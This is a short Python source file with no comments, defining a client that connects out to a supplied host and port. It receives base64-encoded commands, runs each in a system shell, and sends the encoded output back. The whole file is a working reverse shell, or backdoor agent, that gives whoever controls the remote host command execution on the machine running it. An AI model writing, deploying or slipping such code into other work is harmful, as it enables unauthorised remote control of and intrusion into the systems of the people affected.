import socket
import subprocess
import base64

def run_client(host: str, port=int):
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
		conn.connect((host, port))

		while True:
			rcv = conn.recv(1024)
			data = base64.decodebytes(rcv).decode("ascii")
			
			proc = subprocess.run(data, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
			response = base64.encodebytes(proc.stdout if proc.stdout != None else b'\0')
			conn.send(response)
